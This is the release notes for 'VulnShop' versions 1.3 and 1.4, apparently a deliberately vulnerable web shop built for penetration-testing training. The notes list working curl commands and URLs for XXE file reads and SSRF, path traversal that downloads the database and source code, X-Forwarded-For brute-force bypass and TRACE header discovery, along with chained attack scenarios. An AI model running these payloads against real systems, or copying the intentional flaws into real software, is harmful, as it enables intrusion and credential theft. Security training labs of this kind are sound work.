# 🔧 Bug Fixes & Updates - VulnShop

## Version 1.4 - Final Security Feature Implementation

### ✅ ALL CRITICAL ISSUES FIXED

#### 1. **Auth Token Validation** ✅ NOW ENFORCED
- **Previous Issue**: Changing auth token value had no impact
- **Fix**: Token now validated against database
  - Token must match SHA1(user.password) from database
  - Invalid tokens return 401
  - Changing token value now blocks access
- **Test**:
  ```bash
  # Login to get valid token
  curl -X POST http://localhost:3001/api/auth/login \
    -d '{"username":"admin","password":"admin"}' -c cookies.txt
  
  # Access works
  curl http://localhost:3001/api/cart/1 -b cookies.txt
  
  # Modify cookie value
  # Edit cookies.txt and change authToken value
  
  # Access fails with 401
  curl http://localhost:3001/api/cart/1 -b cookies.txt
  ```
- **Vulnerability Preserved**: SHA1 is weak and can be cracked

#### 2. **Brute Force IP Blacklisting** ✅ IMPLEMENTED
- **Previous Issue**: Only rate limited, didn't blacklist
- **Fix**: 5 failed attempts = IP blacklisted for 5 minutes
  - Works on localhost too
  - Complete block, not just throttling
  - Console logs blacklisted IPs
- **Test**:
  ```bash
  # Try 6 failed logins
  for i in {1..6}; do
    curl -X POST http://localhost:3001/api/auth/login \
      -d '{"username":"admin","password":"wrong"}'
  done
  
  # 6th attempt gets 403: "IP address blocked for 5 minutes"
  # All subsequent attempts blocked for 5 minutes
  ```
- **Vulnerability**: X-Forwarded-For bypass still works
  ```bash
  # Bypass by changing IP header
  curl -X POST http://localhost:3001/api/auth/login \
    -H "X-Forwarded-For: 1.2.3.4" \
    -d '{"username":"admin","password":"wrong"}'
  ```

#### 3. **UI Button Text** ✅ CLEANED UP
- **Changed**: "Check Stock (XML)" → "Check Stock"
- Cleaner UI, less obvious about XXE vulnerability
- Maintains same XXE functionality

#### 4. **XXE with SSRF Support** ✅ FULLY IMPLEMENTED
- **Previous Issue**: XXE only read local files
- **Fix**: Now supports both local files AND SSRF
  - File protocol: Read local files
  - HTTP/HTTPS protocol: SSRF to any endpoint
  - Can access internal services
  - Can exfiltrate data to external servers

**Local File Read (XXE):**
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'
```

**SSRF to Internal Endpoint:**
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'

# Returns metrics data even without custom header!
```

**SSRF to External Service:**
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://example.com">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'
```

**SSRF with Custom Header (Combined Attack):**
```bash
# Use XXE/SSRF to access protected /metrics endpoint
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'

# Even though /metrics requires X-Internal-Auth-Key header,
# SSRF from XXE bypasses this since request comes from localhost!
```

#### 5. **Path Traversal via Profile Photo** ✅ FULLY EXPLOITABLE
- **Previous Issue**: Path traversal not properly implemented
- **Fix**: New `/api/view-photo` endpoint with path traversal
  - Profile page shows "View Profile Photo" link
  - URL contains `?photo=filename` parameter
  - Parameter vulnerable to path traversal
  - Hint displayed in UI: "Try modifying the 'photo' parameter"

**How It Works:**
1. Upload profile photo
2. Profile page shows link: `http://localhost:3001/api/view-photo?photo=yourfile.jpg`
3. Click link to view photo in new tab
4. Modify URL parameter to traverse directories

**Exploitation Examples:**

**Read server.js:**
```
http://localhost:3001/api/view-photo?photo=../../../server.js
```

**Read package.json:**
```
http://localhost:3001/api/view-photo?photo=../../../package.json
```

**Read database:**
```
http://localhost:3001/api/view-photo?photo=../../../../database/ecommerce.db
```

**Read /etc/passwd (Linux/Mac):**
```
http://localhost:3001/api/view-photo?photo=../../../../../etc/passwd
```

**Read Windows files:**
```
http://localhost:3001/api/view-photo?photo=../../../../../Windows/win.ini
```

**Using curl to download:**
```bash
# Download database
curl "http://localhost:3001/api/view-photo?photo=../../../../database/ecommerce.db" -o database.db

# Read server source
curl "http://localhost:3001/api/view-photo?photo=../../../server.js"

# Read system files
curl "http://localhost:3001/api/view-photo?photo=../../../../../etc/passwd"
```

---

## 🆕 New Features & Improvements

### Enhanced Authentication
- Token validation against database
- Proper error messages for invalid tokens
- User object attached to requests

### Aggressive Brute Force Protection
- 5-minute IP blacklist (not just rate limit)
- Works on localhost
- Console logging of blacklisted IPs
- Clear error messages with time remaining

### Full XXE Capabilities
- Local file reading (file://)
- SSRF via HTTP/HTTPS
- Internal service access
- External data exfiltration
- Bypass protected endpoints via SSRF

### User-Friendly Path Traversal
- Profile photo viewing page
- Direct link to exploit
- Visual hint for users
- Works in browser and via curl

---

## 🎯 Complete Attack Chains

### Chain 1: XXE → SSRF → Internal Data Theft
```bash
# Use XXE to access protected /metrics endpoint via SSRF
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'

# Response includes:
# - API keys (Stripe, AWS)
# - Database password
# - Secret keys
# No custom header needed because request comes from localhost!
```

### Chain 2: Path Traversal → Full Source Code
```bash
# 1. Upload any profile photo
# 2. View profile to get URL
# 3. Modify URL to read all files:

curl "http://localhost:3001/api/view-photo?photo=../../../server.js" > server.js
curl "http://localhost:3001/api/view-photo?photo=../../../package.json" > package.json
curl "http://localhost:3001/api/view-photo?photo=../../../../database/ecommerce.db" -o db.db

# 4. Analyze source code for vulnerabilities
# 5. Extract database credentials
# 6. Dump all user data
```

### Chain 3: XXE → File Read → Path Traversal → Database
```bash
# 1. Use XXE to find database location
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///app/server.js">]><stockCheck><productId>&xxe;</productId></stockCheck>'

# 2. Found: database at ../database/ecommerce.db
# 3. Use path traversal to download
curl "http://localhost:3001/api/view-photo?photo=../../../../database/ecommerce.db" -o database.db

# 4. Extract all passwords
sqlite3 database.db "SELECT username, password FROM users"
```

### Chain 4: Brute Force Bypass → Token Manipulation
```bash
# 1. Bypass rate limit with X-Forwarded-For
for i in {1..100}; do
  curl -X POST http://localhost:3001/api/auth/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"username":"admin","password":"pass$i"}' -c cookies$i.txt
done

# 2. If successful, token is saved
# 3. Token is SHA1(password) - can be cracked offline
# 4. Generate rainbow tables for common passwords
```

---

## 🧪 Comprehensive Testing Guide

### Test Auth Token Enforcement
```bash
# 1. Get valid token
curl -X POST http://localhost:3001/api/auth/login \
  -d '{"username":"admin","password":"admin"}' -c cookies.txt

# 2. Works
curl http://localhost:3001/api/cart/1 -b cookies.txt

# 3. Change authToken in cookies.txt to random value
sed -i 's/authToken\t.*/authToken\tinvalidtoken123/' cookies.txt

# 4. Fails with 401
curl http://localhost:3001/api/cart/1 -b cookies.txt
```

### Test IP Blacklisting
```bash
# Trigger blacklist
for i in {1..6}; do
  echo "Attempt $i"
  curl -X POST http://localhost:3001/api/auth/login \
    -d '{"username":"admin","password":"wrong"}'
done

# Wait 5 minutes or restart server to clear blacklist
```

### Test XXE with SSRF
```bash
# SSRF to metrics
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]><stockCheck><productId>&xxe;</productId></stockCheck>' | jq

# SSRF to external service
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://www.google.com">]><stockCheck><productId>&xxe;</productId></stockCheck>'
```

### Test Path Traversal
```
# In browser:
1. Login to any account
2. Upload profile photo
3. Go to profile page
4. Click "View Profile Photo" link
5. URL will be: http://localhost:3001/api/view-photo?photo=filename.jpg
6. Change to: http://localhost:3001/api/view-photo?photo=../../../server.js
7. Server source code displayed!
```

---

## ✅ Complete Verification Checklist

### Authentication
- [ ] Invalid tokens return 401
- [ ] Changing token value blocks access
- [ ] Valid tokens work correctly

### Brute Force
- [ ] 5 failed attempts allowed
- [ ] 6th attempt blocks IP for 5 minutes
- [ ] Works on localhost
- [ ] X-Forwarded-For bypass works
- [ ] Blacklist clears after 5 minutes

### XXE
- [ ] File reading works (file://)
- [ ] SSRF works (http://)
- [ ] Can access /metrics via SSRF
- [ ] Can access external URLs
- [ ] Returns file content in response

### Path Traversal
- [ ] Profile photo link appears
- [ ] Can view uploaded photo
- [ ] Can traverse to ../../../server.js
- [ ] Can read /etc/passwd
- [ ] Can download database
- [ ] Works in browser and curl

### All Other Vulnerabilities
- [ ] SQL Injection works
- [ ] IDOR works
- [ ] XSS works
- [ ] Command Injection works
- [ ] 40+ other vulnerabilities intact

---

## 🔄 Update Instructions

1. **Stop servers**
2. **Delete old folder**
3. **Extract new ZIP**
4. **Fresh database**:
   ```cmd
   cd backend
   del ..\database\ecommerce.db
   npm run init-db
   ```
5. **Start servers**:
   - `start-backend.bat`
   - `start-frontend.bat`

---

## 📊 Final Vulnerability Count

**Total**: 50+ exploitable vulnerabilities

**Categories**:
- **Authentication**: 15 vulnerabilities
- **Authorization (IDOR)**: 10 vulnerabilities
- **Injection**: 7 vulnerabilities (SQL, Command, XXE, XSS)
- **File Operations**: 5 vulnerabilities
- **SSRF**: 3 vulnerabilities
- **Security Misconfiguration**: 10+ vulnerabilities

**All fully exploitable for penetration testing training!**

---

**Version**: 1.4  
**Release Date**: February 2025  
**Status**: ALL FEATURES COMPLETE ✅  
**Vulnerabilities**: 50+ FULLY EXPLOITABLE 🎯  
**Production Ready**: ABSOLUTELY NOT ⚠️  
**Training Ready**: ABSOLUTELY YES ✅

### ✅ All Critical Issues FIXED

#### 1. **Authentication Token Enforcement** ✅ IMPLEMENTED
- **Issue**: Auth tokens were issued but never checked
- **Fix**: 
  - Added `checkAuth` middleware to all protected endpoints
  - Cart, orders, profile, wallet now require authentication
  - Returns 401 if no auth token present
- **Vulnerability Preserved**: 
  - Token is weak (SHA1 of password)
  - No expiration
  - Not validated against database (intentional for training)
- **Testing**: Try accessing `/api/cart/1` without login → 401 error

#### 2. **Brute Force Protection** ✅ IMPLEMENTED
- **Issue**: No rate limiting on login attempts
- **Fix**: 
  - Rate limiting: 5 attempts per minute per IP
  - Returns 429 after 5 failed attempts
  - 1-minute timeout before retry
- **Vulnerability Preserved**:
  - **X-Forwarded-For bypass** - Can spoof IP to bypass rate limit
  - Add header `X-Forwarded-For: any.ip.here` to bypass
- **Testing**: 
  - Try 6 failed logins → 6th returns 429
  - Add `X-Forwarded-For: 1.2.3.4` header → bypasses limit

#### 3. **Custom Header Discovery via TRACE** ✅ IMPLEMENTED
- **Issue**: Need endpoint requiring custom header, discoverable via TRACE
- **Fix**: 
  - `/metrics` endpoint requires `X-Internal-Auth-Key` header
  - Header value: `secret_metric_key_12345`
  - TRACE method reveals the secret header
- **Exploitation**:
  ```bash
  # Discover header
  curl -X TRACE http://localhost:3001/metrics -v
  
  # Use discovered header
  curl http://localhost:3001/metrics \
    -H "X-Internal-Auth-Key: secret_metric_key_12345"
  ```
- **Sensitive Data Exposed**: API keys, database passwords, internal endpoints

#### 4. **XXE Vulnerability** ✅ FULLY EXPLOITABLE
- **Issue**: Stock check not vulnerable to XXE
- **Fix**: Completely rewrote XML parser to enable XXE attacks
- **Capabilities**:
  - Read local files (`/etc/passwd`, `win.ini`)
  - Read application source code
  - Read database files
  - SSRF to internal endpoints
- **Testing**:
  ```bash
  curl -X POST http://localhost:3001/api/products/check-stock \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
  <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <stockCheck><productId>&xxe;</productId></stockCheck>'
  ```
- **Response**: Returns file content in `xxeData` field

#### 5. **Path Traversal Vulnerability** ✅ FULLY EXPLOITABLE
- **Issue**: Path traversal not implemented
- **Fix**: Added vulnerable `/api/products/image` endpoint
- **Capabilities**:
  - Read files outside images directory
  - Download source code
  - Download database
  - Read system files
- **Testing**:
  ```
  # Read server source
  http://localhost:3001/api/products/image?file=../../../server.js
  
  # Read /etc/passwd
  http://localhost:3001/api/products/image?file=../../../../../etc/passwd
  
  # Download database
  http://localhost:3001/api/products/image?file=../../../../database/ecommerce.db
  ```

---

## 🆕 New Features

### Authentication System
- Auth middleware on all protected endpoints
- Proper 401 responses when not authenticated
- Token validation (weak but present)

### Rate Limiting
- Login attempt tracking per IP
- Automatic reset after 1 minute
- Clear error messages with countdown

### TRACE Method Discovery
- TRACE reveals custom headers
- Hints provided in response
- Full header name and value disclosed

### Advanced XXE
- External entity processing enabled
- File system access
- Error messages show attempted paths
- Works on Windows and Linux

### Path Traversal
- No path sanitization
- No directory restrictions
- Can access any readable file
- Works with ../ sequences

---

## 🧪 Comprehensive Testing

### Quick Vulnerability Tests

**Test Auth Enforcement:**
```bash
# Without auth - should fail
curl http://localhost:3001/api/cart/1

# With auth - should work
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  -c cookies.txt

curl http://localhost:3001/api/cart/1 -b cookies.txt
```

**Test Brute Force Bypass:**
```bash
# Bypass rate limit with X-Forwarded-For
for i in {1..10}; do
  curl -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"username":"admin","password":"wrong"}'
done
```

**Test TRACE Discovery:**
```bash
curl -X TRACE http://localhost:3001/metrics -v
# Headers reveal: X-Internal-Auth-Key: secret_metric_key_12345

curl http://localhost:3001/metrics \
  -H "X-Internal-Auth-Key: secret_metric_key_12345"
```

**Test XXE:**
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId></stockCheck>'
```

**Test Path Traversal:**
```
http://localhost:3001/api/products/image?file=../../../server.js
```

---

## 📚 New Documentation

**VULNERABILITY_TESTING.md** - Complete testing guide for all vulnerabilities with:
- Step-by-step exploitation instructions
- curl commands for each vulnerability
- Windows and Linux examples
- Attack chain combinations
- Verification checklist

---

## 🔄 Migration from Previous Version

1. **Stop servers**
2. **Delete old folder**
3. **Extract new ZIP**
4. **Fresh database recommended**:
   ```cmd
   cd backend
   del ..\database\ecommerce.db
   npm run init-db
   ```
5. **Start servers**:
   - `start-backend.bat`
   - `start-frontend.bat`

---

## ✅ Complete Verification Checklist

### Authentication
- [ ] Protected endpoints return 401 without auth
- [ ] Protected endpoints work with auth token
- [ ] Token persists after logout (vulnerability)

### Brute Force
- [ ] 5 login attempts allowed
- [ ] 6th attempt returns 429
- [ ] X-Forwarded-For bypass works

### TRACE Discovery
- [ ] TRACE method works
- [ ] Headers reveal X-Internal-Auth-Key
- [ ] /metrics accessible with header
- [ ] Sensitive data returned

### XXE
- [ ] Normal stock check works
- [ ] XXE reads /etc/passwd
- [ ] XXE reads application files
- [ ] File content returned in response

### Path Traversal
- [ ] Normal images load
- [ ] ../ traversal works
- [ ] Can read server.js
- [ ] Can download database
- [ ] Can read system files

### All Other Vulnerabilities
- [ ] SQL Injection still works
- [ ] IDOR still works
- [ ] XSS still works
- [ ] Command Injection still works
- [ ] CSRF still works
- [ ] 35+ other vulnerabilities intact

---

## 🎯 Attack Scenarios

### Scenario 1: Full Application Compromise
1. Use TRACE to discover custom header
2. Access /metrics with header → Get API keys
3. Use XXE to read server.js → Find database path
4. Use path traversal to download database
5. Extract all user credentials
6. Use SQL injection to become admin
7. Use command injection for RCE

### Scenario 2: Credential Theft
1. Bypass brute force with X-Forwarded-For
2. Attempt password guessing (no lockout)
3. Use XXE to read database directly
4. Extract password hashes
5. Crack SHA1 hashes (weak algorithm)

### Scenario 3: Data Exfiltration
1. Path traversal to read all source code
2. XXE to read configuration files
3. Access /metrics for API keys
4. Download entire database
5. Extract all customer data

---

## 🔒 Vulnerability Summary

**Total Vulnerabilities**: 45+

**Categories**:
- Authentication: 13 vulnerabilities
- Authorization: 8 vulnerabilities (IDOR)
- Injection: 5 vulnerabilities (SQL, Command, XXE, XSS)
- Security Misconfiguration: 12 vulnerabilities
- Broken Access Control: 7 vulnerabilities

**All vulnerabilities are intentionally preserved for training!**

---

**Version**: 1.3  
**Release Date**: February 2025  
**Status**: All critical features implemented ✅  
**Vulnerabilities**: 45+ fully exploitable 🎯  
**Ready for**: Penetration testing training, security workshops, CTF challenges
